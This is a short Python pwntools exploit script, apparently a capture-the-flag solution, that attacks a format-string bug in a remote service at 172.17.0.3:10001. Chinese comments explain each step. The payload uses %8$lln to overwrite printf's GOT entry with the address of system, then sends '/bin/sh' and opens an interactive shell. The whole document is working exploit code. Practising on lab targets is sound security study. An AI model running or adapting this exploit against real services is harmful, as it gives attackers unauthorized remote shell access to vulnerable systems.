#!/usr/bin/python
#coding:utf-8

from pwn import *

io = remote('172.17.0.3', 10001)
context.update(arch = 'i386', os = 'linux')

offset = 8
printf_got = 0x00601020
system_plt = 0x00400460

payload = "a%" 					#第一个a用来使地址前面的数据对齐
payload += str(system_plt-1)	#写入的字节数，注意前面有一个a，需要-1
payload += "c%8$lln"			#注意是lln，一次性写入
payload += p64(printf_got)		#被写入的地址

io.sendline(payload)
io.recv()
io.sendline('/bin/sh\x00')
io.interactive()
